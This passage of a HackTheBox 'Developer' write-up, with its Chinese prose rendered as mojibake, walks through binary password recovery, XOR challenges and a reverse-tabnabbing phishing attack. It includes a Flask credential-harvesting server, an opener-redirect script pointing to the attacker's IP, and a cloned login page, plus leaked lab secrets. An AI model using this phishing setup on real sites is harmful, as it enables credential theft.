ä¸ºæœ‰<code>ALSR</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨<code>main</code>å¤„æ–­ç‚¹</p>\n<pre><code class=\"hljs language-bash\"> â–º 0x5555555551f7 &#x3C;main+4>      sub    rsp, 0x30                       RSP => 0x7fffffffdf30 (0x7fffffffdf60 - 0x30)\n   0x5555555551fb &#x3C;main+8>      mov    dword ptr [rbp - 0x24], edi     [0x7fffffffdf3c] &#x3C;= 1\n   0x5555555551fe &#x3C;main+11>     mov    qword ptr [rbp - 0x30], rsi     [0x7fffffffdf30] &#x3C;= 0x7fffffffe078 â€”â–¸ 0x7fffffffe372 â—‚â€” <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/pwnme'</span>\n   0x555555555202 &#x3C;main+15>     cmp    dword ptr [rbp - 0x24], 1       1 - 1     EFLAGS => 0x246 [ cf PF af ZF sf IF <span class=\"hljs-built_in\">df</span> of ac ]\n   0x555555555206 &#x3C;main+19>   âœ˜ jg     main+38                     &#x3C;main+38>\n \n   0x555555555208 &#x3C;main+21>     lea    rdi, [rip + 0xdf9]              RDI => 0x555555556008 â—‚â€” <span class=\"hljs-string\">'Please enter your password as a program argument!'</span>\n   0x55555555520f &#x3C;main+28>     call   puts@plt                    &#x3C;puts@plt>\n \n   0x555555555214 &#x3C;main+33>     jmp    main+175                    &#x3C;main+175>\n    â†“\n   0x5555555552a2 &#x3C;main+175>    mov    eax, 0     EAX => 0\n   0x5555555552a7 &#x3C;main+180>    leave  \n   0x5555555552a8 &#x3C;main+181>    ret    \n</code></pre>\n<pre><code class=\"hljs language-bash\">pwndbg> b *0x5555555551de\nBreakpoint 2 at 0x5555555551de\npwndbg> c                                  \nContinuing.                                                                                                       \n                                                                                                                  \nBreakpoint 2, 0x00005555555551de <span class=\"hljs-keyword\">in</span> check_password ()                                                             \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n*RAX  0x7fffffffdef0 â—‚â€” 0x9700333231 /* <span class=\"hljs-string\">'123'</span> */                                                                  \n RBX  0x7fffffffe068 â€”â–¸ 0x7fffffffe36e â—‚â€” <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/pwnme'</span>\n*RCX  0x336e6179696173                                                                                                                                                                                                              \n*RDX  0x7fffffffdee0 â—‚â€” <span class=\"hljs-string\">'supersaiyan3'</span>  \n*RDI  0x7fffffffdef0 â—‚â€” 0x9700333231 /* <span class=\"hljs-string\">'123'</span> */\n*RSI  0x7fffffffdee0 â—‚â€” <span class=\"hljs-string\">'supersaiyan3'</span>\n</code></pre>\n<p>æˆ‘ä»¬èƒ½çœ‹åˆ°å¯„å­˜å™¨ä¸Šçš„å€¼æ˜¯<code>supersaiyan3</code></p>\n<pre><code class=\"hljs language-bash\">âœ  Developer ./pwnme supersaiyan3           \nPassword correct. Here<span class=\"hljs-string\">'s a flag:\nDHTB{b4s1c0v3rF7ow}\n</span></code></pre>\n<h3>Esay Encryption</h3>\n<p>éœ€è¦è§£å¯†<code>DRwdFjIMJiYgOi4dOhI8OjQ=</code></p>\n<p>ä¸‹è½½ä¼šç»™å‡ºä¸€ä¸ªå¼‚æˆ–è„šæœ¬</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python3</span>\nfrom itertools import izip, cycle\nimport <span class=\"hljs-built_in\">base64</span>\n\ndef xor_crypt_string(data, key=<span class=\"hljs-string\">'**'</span>):\n    xored = <span class=\"hljs-string\">''</span>.<span class=\"hljs-built_in\">join</span>(chr(ord(x) ^ ord(y)) <span class=\"hljs-keyword\">for</span> (x,y) <span class=\"hljs-keyword\">in</span> izip(data, cycle(key)))\n    <span class=\"hljs-built_in\">return</span> base64.encodestring(xored).strip()\n\nsecret_data = <span class=\"hljs-string\">\"&#x3C;REDACTED>\"</span>\n<span class=\"hljs-built_in\">print</span> xor_crypt_string(secret_data)\n</code></pre>\n<p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“<code>key</code>æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½çŸ¥é“å‰äº”ä½æ˜¯ <code>DHTB{</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image11.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬åè¿‡æ¥å³å¯å¾—åˆ°<code>flag</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image12.png\" alt=\"image.png\"></p>\n<h3>Triple Whammy</h3>\n<p>We've been told these keys hold a secret message, can you decode it?</p>\n<pre><code class=\"hljs language-bash\">c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\nfb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\n7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\n</code></pre>\n<p>è§£å‹åå¾—åˆ°çš„è„šæœ¬</p>\n<pre><code class=\"hljs language-bash\">import os\nfrom secret import flag\n\ndef bxor(ba1, ba2):\n    <span class=\"hljs-built_in\">return</span> bytes([_a ^ _b <span class=\"hljs-keyword\">for</span> _a, _b <span class=\"hljs-keyword\">in</span> zip(ba1, ba2)])\n\nkey1 = os.urandom(len(flag))\nkey2 = os.urandom(len(flag))\n\nct1 = bxor(key1, flag)\nct2 = bxor(ct1, key2)\nct3 = bxor(key2, flag)\n\n<span class=\"hljs-built_in\">print</span>(ct1.hex())\n<span class=\"hljs-built_in\">print</span>(ct2.hex())\n<span class=\"hljs-built_in\">print</span>(ct3.hex())\n</code></pre>\n<p><code>AI</code>ä¸€æŠŠæ¢­å“ˆ</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python3</span>\n\ndef bxor(ba1, ba2):\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"Performs a byte-wise XOR operation on two byte strings.\"</span><span class=\"hljs-string\">\"\"</span>\n    <span class=\"hljs-built_in\">return</span> bytes([_a ^ _b <span class=\"hljs-keyword\">for</span> _a, _b <span class=\"hljs-keyword\">in</span> zip(ba1, ba2)])\n\n<span class=\"hljs-comment\"># 1. ä»é¢˜ç›®ä¸­è·å–çš„ä¸‰ä¸ªåå…­è¿›åˆ¶å¯†æ–‡</span>\nhex_ct1 = <span class=\"hljs-string\">\"c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\"</span>\nhex_ct2 = <span class=\"hljs-string\">\"fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\"</span>\nhex_ct3 = <span class=\"hljs-string\">\"7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\"</span>\n\n<span class=\"hljs-comment\"># 2. å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆbytesï¼‰å¯¹è±¡</span>\nct1 = bytes.fromhex(hex_ct1)\nct2 = bytes.fromhex(hex_ct2)\nct3 = bytes.fromhex(hex_ct3)\n\n<span class=\"hljs-comment\"># 3. æ ¹æ®æ¨å¯¼ï¼Œå°†ä¸‰ä¸ªå¯†æ–‡å…¨éƒ¨å¼‚æˆ–</span>\n<span class=\"hljs-comment\"># flag = ct1 ^ ct2 ^ ct3</span>\n<span class=\"hljs-comment\"># æˆ‘ä»¬å¯ä»¥åˆ†ä¸¤æ­¥æ¥å®Œæˆ</span>\ntemp_xor_result = bxor(ct1, ct2)\nflag_bytes = bxor(temp_xor_result, ct3)\n\n<span class=\"hljs-comment\"># 4. å°†æ¢å¤çš„å­—èŠ‚æ•°æ®è§£ç ä¸ºUTF-8å­—ç¬¦ä¸²å¹¶æ‰“å°</span>\ntry:\n    flag = flag_bytes.decode(<span class=\"hljs-string\">'utf-8'</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"ğŸ‰ Flag has been successfully recovered!\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] Flag: {flag}\"</span>)\nexcept UnicodeDecodeError:\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"âŒ Could not decode the result as a UTF-8 string.\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] Raw bytes (hex): {flag_bytes.hex()}\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">ğŸ‰ Flag has been successfully recovered!\n[*] Flag: DHTB{XorXorXorFunFunFun}\n</code></pre>\n<h2>é’“é±¼æ”»å‡»</h2>\n<p>å…¶å®åšå®Œä¸€é“é¢˜å°±å¯ä»¥ç»§ç»­æ‰“äº†</p>\n<p>åšå®Œåæœ‰ä¸€ä¸ªæäº¤<code>writeup</code>çš„è¾“å…¥æ¡†</p>\n<p>æˆ‘ä»¬å¼€å¯<code>Web</code>æœåŠ¡å™¨ï¼Œå¹¶æäº¤æ”¹åœ°å€ä¸Šå»ï¼Œçœ‹æ˜¯å¦æœ‰äººä¼šè®¿é—®</p>\n<p>ä¸ä¸€ä¼šå°±æœ‰å›æ˜¾äº†</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.103 - - [21/Jun/2025 18:53:48] <span class=\"hljs-string\">\"GET / HTTP/1.1\"</span> 200 -\n10.10.11.103 - - [21/Jun/2025 18:53:49] code 404, message File not found\n10.10.11.103 - - [21/Jun/2025 18:53:49] <span class=\"hljs-string\">\"GET /favicon.ico HTTP/1.1\"</span> 404 -\n</code></pre>\n<p>ä½†æ˜¯æˆ‘ä»¬è¿˜ä¸çŸ¥é“è¦å¦‚ä½•è¿›è¡Œåˆ©ç”¨</p>\n<p><code>Sessionid</code>å¼€å¯äº†<code>httponly</code> ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡<code>XSS</code>è·å–</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image13.png\" alt=\"image.png\"></p>\n<p>é€šè¿‡ç›®å½•æ‰«æèƒ½å‘ç°ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶ä¸”æ˜¯åªèƒ½<code>admin</code>æ‰èƒ½è®¿é—®</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image14.png\" alt=\"image.png\"></p>\n<p>ä½†æ˜¯ç°åœ¨æ²¡ä»€ä¹ˆç”¨ï¼Œå›åˆ°åå°ï¼Œæˆ‘å‘ç°å½“æˆ‘ä»¬æäº¤äº†<code>writeup</code>åï¼Œä¼šåœ¨<code>profile</code>ä¸­ç”Ÿæˆä¸€ä¸ªé“¾æ¥</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image15.png\" alt=\"image.png\"></p>\n<p>é‡è¦çš„æ˜¯è¿™ä¸ªé“¾æ¥å…·æœ‰<code>target</code>å±æ€§ï¼Œå…¶å€¼ä¸º<code>_blank</code>,åŒæ—¶æ²¡æœ‰ä½¿ç”¨<code>rel=\"noopener\"</code>å±æ€§ï¼Œè¿™è®©æˆ‘æƒ³èµ·<code>Reverse_Tabnabbing</code> ï¼ˆæ ‡ç­¾é¡µåŠ«æŒæ”»å‡»ï¼‰æ¼æ´ï¼Œä¹‹å‰æœ‰åœ¨<code>Vulnhub</code>ä¸Šçš„ä¸€å°é¶æœºï¼ˆ<a href=\"https://www.vulnhub.com/entry/napping-101,752/%EF%BC%89%E9%81%87%E5%88%B0%E8%BF%87\">https://www.vulnhub.com/entry/napping-101,752/ï¼‰é‡åˆ°è¿‡</a></p>\n<h3>Reverse_Tabnabbing</h3>\n<blockquote>\n<p><a href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\">https://owasp.org/www-community/attacks/Reverse_Tabnabbing</a></p>\n</blockquote>\n<p>ç›‘å¬ä¸€ä¸‹å¯¹æ–¹è¯·æ±‚</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer nc -lvp 80    \nlistening on [any] 80 ...\nconnect to [10.10.16.58] from developer.htb [10.10.11.103] 47222\nGET / HTTP/1.1\nHost: 10.10.16.58\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 21 Jun 2025 11:08:45 GMT\n</code></pre>\n<p>å›æ˜¾ä¸­æœ‰<code>firefox</code>çš„<code>UA</code>ï¼Œå¾ˆå¤§æ¦‚ç‡ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®çš„</p>\n<p>ç°åœ¨çš„æ€è·¯æ˜¯ï¼šæäº¤è·³è½¬é“¾æ¥ï¼Œç„¶åä¼ªé€ ä¸€ä¸ªå’Œ<code>developer.htb</code> çš„ç™»å½•é¡µé¢ä¸€æ ·ç«™ç‚¹ï¼Œå¯¹æ–¹ç‚¹å‡»åï¼Œå¼¹åˆ°<code>writeup</code>é¡µé¢ï¼Œç„¶ååŸå§‹é¡µé¢ï¼ˆ<code>dashbroad</code>ï¼‰å˜æˆæˆ‘ä»¬çš„é’“é±¼ç½‘ç«™ï¼Œè®©å¯¹æ–¹ä»¥ä¸ºç™»å½•æ‰äº†ï¼Œç„¶åæˆ‘ä»¬è·å–å‡­è¯</p>\n<p>è¿™é‡Œå€Ÿç”¨ï¼š<a href=\"https://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data\">https://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data</a> çš„æ–¹æ³•ï¼Œæˆ‘è‡ªå·±å¼„äº†å¥½ä¹…æ²¡å¼„å¥½</p>\n<p>æ­å»ºé’“é±¼æœåŠ¡å™¨</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer <span class=\"hljs-built_in\">cat</span> server2.py  \nfrom flask import *\n\napp = Flask(__name__, template_folder=<span class=\"hljs-string\">'.'</span>)\n\n@app.route(<span class=\"hljs-string\">\"/writeup\"</span>)\ndef writeup():\n    <span class=\"hljs-built_in\">return</span> render_template(<span class=\"hljs-string\">'writeup.html'</span>)\n\n@app.route(<span class=\"hljs-string\">\"/accounts/login/\"</span>, methods=[<span class=\"hljs-string\">'GET'</span>, <span class=\"hljs-string\">'POST'</span>])\ndef login():\n\n    <span class=\"hljs-keyword\">if</span> request.method == <span class=\"hljs-string\">'POST'</span>:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'\\n'</span>.<span class=\"hljs-built_in\">join</span>([f<span class=\"hljs-string\">'{x[0]}: {x[1]}'</span> <span class=\"hljs-keyword\">for</span> x <span class=\"hljs-keyword\">in</span> request.form.items()]))\n        <span class=\"hljs-built_in\">return</span> redirect(<span class=\"hljs-string\">\"http://10.10.10.120/accounts/login/\"</span>, code=302)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">return</span> render_template(<span class=\"hljs-string\">'login.html'</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    app.run(host=<span class=\"hljs-string\">\"0.0.0.0\"</span>, port=80)\n</code></pre>\n<p>è·³è½¬ç½‘ç«™</p>\n<pre><code class=\"hljs language-bash\">&#x3C;html>\n  &#x3C;body>\n    &#x3C;h2>Challenge Writeup&#x3C;/h2>\n    &#x3C;p>Something&#x3C;/p>\n    &#x3C;script>\n    <span class=\"hljs-keyword\">if</span> (window.opener) window.opener.parent.location.replace(<span class=\"hljs-string\">'http://10.10.16.58/accounts/login/'</span>);\n    <span class=\"hljs-keyword\">if</span> (window.parent != window) window.parent.location.replace(<span class=\"hljs-string\">'https://10.10.16.58/accounts/login/'</span>);           \n    &#x3C;/script>\n  &#x3C;/body>\n&#x3C;/html>\n</code></pre>\n<p>åˆ¶é€ é’“é±¼ç«™ç‚¹</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer curl http://developer.htb/accounts/login/ > login.html                                                \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1938  100  1938    0     0  13686      0 --:--:-- --:--:-- --:--:-- 13744\n</code></pre>\n<p>ä¿®æ”¹é‡Œé¢çš„é™æ€å†…å®¹ä¸ºç»å¯¹è·¯å¾„å¹¶å°†<code>action</code> æ”¹ä¸º<code>/accounts/login/</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;!doctype html>\n&#x3C;html lang=<span class=\"hljs-string\">\"en\"</span>>\n  &#x3C;<span class=\"hljs-built_in\">head</span>>\n    &#x3C;meta charset=<span class=\"hljs-string\">\"utf-8\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1, shrink-to-fit=no\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"description\"</span> content=<span class=\"hljs-string\">\"\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"author\"</span> content=<span class=\"hljs-string\">\"\"</span>>\n    &#x3C;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">\"icon\"</span> href=<span class=\"hljs-string\">\"http://developer.htb/img/favicon.ico\"</span>>\n    &#x3C;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"http://developer.htb/static/css/jquery.toasts.css\"</span>>\n    &#x3C;script src=<span class=\"hljs-string\">\"http://developer.htb/static/js/all.min.js\"</span>>&#x3C;/script>\n    &#x3C;script src=<span class=\"hljs-string\">\"http://developer.htb/static/js/jquery-3.2.1.min.js\"</span>>&#x3C;/script>\n    &#x3C;title>Login | Developer.HTB&#x3C;/title>\n\n    &#x3C;!-- Bootstrap core CSS -->\n    &#x3C;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"http://developer.htb/static/css/bootstrap.min.css\"</span>>\n\n    &#x3C;!-- Custom styles <span class=\"hljs-keyword\">for</span> this template -->\n    &#x3C;<span class=\"hljs-built_in\">link</span> href=<span class=\"hljs-string\">\"http://developer.htb/static/css/signin.css\"</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span>>\n  &#x3C;/head>\n\n  &#x3C;body class=<span class=\"hljs-string\">\"text-center\"</span>>\n\n    &#x3C;form class=<span class=\"hljs-string\">\"form-signin\"</span> action=<span class=\"hljs-string\">\"/accounts/login/\"</span> method=<span class=\"hljs-string\">\"post\"</span>>\n        &#x3C;input <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"hidden\"</span> name=<span class=\"hljs-string\">\"csrfmiddlewaretoken\"</span> value=<span class=\"hljs-string\">\"3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\"</span>>\n      &#x3C;img class=<span class=\"hljs-string\">\"mb-4\"</span> src=<span class=\"hljs-string\">\"http://developer.htb/static/img/logo.png\"</span> alt=<span class=\"hljs-string\">\"\"</span> width=<span class=\"hljs-string\">\"72\"</span> height=<span class=\"hljs-string\">\"72\"</span>>\n      &#x3C;h1 class=<span class=\"hljs-string\">\"h3 mb-3 font-weight-normal\"</span>>Welcome back!&#x3C;/h1>\n      &#x3C;label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"uname\"</span> class=<span class=\"hljs-string\">\"sr-only\"</span>>User Name&#x3C;/label>\n      &#x3C;input <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text\"</span> <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"id_login\"</span> name=<span class=\"hljs-string\">\"login\"</span> placeholder=<span class=\"hljs-string\">\"Username\"</span> class=<span class=\"hljs-string\">\"form-control\"</span> required autofocus>\n      &#x3C;label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"password\"</span> class=<span class=\"hljs-string\">\"sr-only\"</span>>Password&#x3C;/label>\n      &#x3C;input <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"password\"</span> <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"id_password\"</span> name=<span class=\"hljs-string\">\"password\"</span> placeholder=<span class=\"hljs-string\">\"Password\"</span> class=<span class=\"hljs-string\">\"form-control\"</span> required>\n\n      &#x3C;button <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"loginbtn\"</span> class=<span class=\"hljs-string\">\"btn btn-lg btn-primary btn-block\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"submit\"</span>>Sign <span class=\"hljs-keyword\">in</span>&#x3C;/button>\n          &#x3C;a href=<span class=\"hljs-string\">\"http://developer.htb/saccounts/password/reset/\"</span> class=<span class=\"hljs-string\">\"auth-link\"</span>>Forgot password?&#x3C;/a>\n                &#x3C;div class=<span class=\"hljs-string\">\"text-center mt-4 font-weight-light\"</span>> Don<span class=\"hljs-string\">'t have an account? &#x3C;a href=\"http://developer.htb/saccounts/signup/\" >Click here!&#x3C;/a>\n      &#x3C;p class=\"mt-5 mb-3 text-muted\">&#x26;copy; Developer.HTB 2021&#x3C;/p>\n    &#x3C;/form>\n\n&#x3C;script src=\"http://developer.htb/static/js/jquery.toast.js\">&#x3C;/script>\n&#x3C;script>\n\n&#x3C;/script>\n  &#x3C;/body>\n&#x3C;/html>\n</span></code></pre>\n<p>å¼€å¯é’“é±¼æœåŠ¡å™¨ï¼Œå¹¶æäº¤<code>/writeup</code>åˆ°ç«™ç‚¹ä¸­ï¼Œè¿‡ä¸€ä¼šå°±èƒ½æ¥æ”¶åˆ°ç”¨æˆ·çš„å¯†ç äº†</p>\n<pre><code class=\"hljs language-bash\">âœ  Developer python server2.py\n * Serving Flask app <span class=\"hljs-string\">'server2'</span>\n * Debug mode: off\nWARNING: This is a development server. Do not use it <span class=\"hljs-keyword\">in</span> a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:80\n * Running on http://192.168.111.155:80\nPress CTRL+C to quit\n10.10.11.103 - - [21/Jun/2025 20:49:24] <span class=\"hljs-string\">\"GET /writeup HTTP/1.1\"</span> 200 -\n10.10.11.103 - - [21/Jun/2025 20:49:24] <span class=\"hljs-string\">\"GET /accounts/login/ HTTP/1.1\"</span> 200 -\ncsrfmiddlewaretoken: 3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\nlogin: admin\npassword: SuperSecurePassword@HTB2021\n10.10.11.103 - - [21/Jun/2025 20:49:25] <span class=\"hljs-string\">\"POST /accounts/login/ HTTP/1.1\"</span> 302 -\n10.10.11.103 - - [21/Jun/2025 20:49:28] <span class=\"hljs-string\">\"GET /accounts/login/ HTTP/1.1\"</span> 200 -\n</code></pre>\n<p>è¿™é‡Œå¾ˆå¥‡æ€ªçš„å°±æ˜¯ï¼Œæˆ‘è‡ªå·±å¤ç°è¯¥æ¼æ´æ— æ³•å¤ç°æˆåŠŸ</p>\n<h2>Django Secret Key &#x26; RCE</h2>\n<p>æ‹¥æœ‰ç®¡ç†å‘˜å‡­æ®åï¼Œæˆ‘ä»¬å°±èƒ½å¯¹ <code>/admin</code>è¿›è¡Œç™»é™†äº†</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image16.png\" alt=\"image.png\"></p>\n<p>èƒ½å‘ç°ä¸€ä¸ªæ–°çš„å­åŸŸå</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image17.png\" alt=\"image.png\"></p>\n<p>æ­å»ºçš„æ˜¯<code>sentry</code> ä¸€æ¬¾å¼€æºçš„å®æ—¶å¼‚å¸¸ç›‘æ§å¹³å°</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image18.png\" alt=\"image.png\"></p>\n<p>æ³¨å†Œè´¦å·ç™»å½•è¿›å»ï¼Œæ— æ³•ä½¿ç”¨ä¸Šé¢çš„å‡­æ®</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image19.png\" alt=\"image.png\"></p>\n<p>ç‰ˆæœ¬ <code>Sentry 8.0.0</code> åœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°å®ƒçš„ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨è„šæœ¬ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å°†<code>shell</code>å¼¹å›æ¥</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image20.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œä½¿ç”¨ <code>jacob@developer.htb</code> ï¼ˆå¯ä»¥ä»<code>Member</code>é‡Œå¾—åˆ°ï¼‰çš„å‡­æ®å’Œä¸Šè¾¹é’“é±¼å¾—åˆ°çš„å¯†ç æˆåŠŸè·å¾—<code>sentry</code>æ›´é«˜æƒé™</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image21.png\" alt=\"image.png\"></p>\n<p>ç„¶åæ‘¸ç´¢ä¸€ç•ªåï¼Œæˆ‘åˆ›å»ºäº†æ–°çš„<code>project</code>ç„¶ååˆ é™¤ï¼Œä½†æ˜¯åˆ é™¤çš„æ—¶å€™å‡ºç°äº†é”™è¯¯</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image22.png\" alt=\"image.png\"></p>\n<p>è¿˜æœ‰å¾ˆå¤šçš„è°ƒè¯•ä¿¡æ¯</p>\n<pre><code class=\"hljs language-bash\">SENTRY_OPTIONS \t\n\n{<span class=\"hljs-string\">'cache.backend'</span>: <span class=\"hljs-string\">'sentry.cache.redis.RedisCache'</span>,\n <span class=\"hljs-string\">'cache.options'</span>: {},\n <span class=\"hljs-string\">'redis.options'</span>: {<span class=\"hljs-string\">'hosts'</span>: {0: {<span class=\"hljs-string\">'host'</span>: <span class=\"hljs-string\">'127.0.0.1'</span>,\n                                 <span class=\"hljs-string\">'password'</span>: <span class=\"hljs-string\">'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe'</span>,\n                                 <span class=\"hljs-string\">'port'</span>: 6379}}},\n <span class=\"hljs-string\">'system.databases'</span>: {<span class=\"hljs-string\">'default'</span>: {<span class=\"hljs-string\">'ATOMIC_REQUESTS'</span>: False,\n                                  <span class=\"hljs-string\">'AUTOCOMMIT'</span>: True,\n                                  <span class=\"hljs-string\">'CONN_MAX_AGE'</span>: 0,\n                                  <span class=\"hljs-string\">'ENGINE'</span>: <span class=\"hljs-string\">'sentry.db.postgres'</span>,\n                                  <span class=\"hljs-string\">'HOST'</span>: <span class=\"hljs-string\">'localhost'</span>,\n                                  <span class=\"hljs-string\">'NAME'</span>: <span class=\"hljs-string\">'sentry'</span>,\n                                  <span class=\"hljs-string\">'OPTIONS'</span>: {},\n                                  <span class=\"hljs-string\">'PASSWORD'</span>: u<span class=\"hljs-string\">'********************'</span>,\n                                  <span class=\"hljs-string\">'PORT'</span>: <span class=\"hljs-string\">''</span>,\n                                  <span class=\"hljs-string\">'TEST_CHARSET'</span>: None,\n                                  <span class=\"hljs-string\">'TEST_COLLATION'</span>: None,\n                                  <span class=\"hljs-string\">'TEST_MIRROR'</span>: None,\n                                  <span class=\"hljs-string\">'TEST_NAME'</span>: None,\n                                  <span class=\"hljs-string\">'TIME_ZONE'</span>: <span class=\"hljs-string\">'UTC'</span>,\n                                  <span class=\"hljs-string\">'USER'</span>: <span class=\"hljs-string\">'sentry'</span>}},\n <span class=\"hljs-string\">'system.debug'</span>: True,\n <span class=\"hljs-string\">'system.secret-key'</span>: <span class=\"hljs-string\">'c7f3a64aa184b7cbb1a7cbe9cd544913'</span>}\n</code></pre>\n<p>å¯ä»¥çœ‹åˆ°å†…éƒ¨è£…äº†<code>redis</code> ï¼Œå¹¶ä¸”å¯†ç ä¹Ÿå‡ºæ¥äº†ï¼Œä¸‹è¾¹è¿˜æœ‰ä¸ªæœ‰è¶£çš„<code>secret-key</code></p>\n<p>ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œ<code>secret-key</code> ä¼šå¯¼è‡´ååºåˆ—åŒ–çš„<code>RCE</code>æ¼æ´</p>\n<p>å…¶ä¸­æœ‰ä¸€ç¯‡æ–‡ç« ï¼š<a 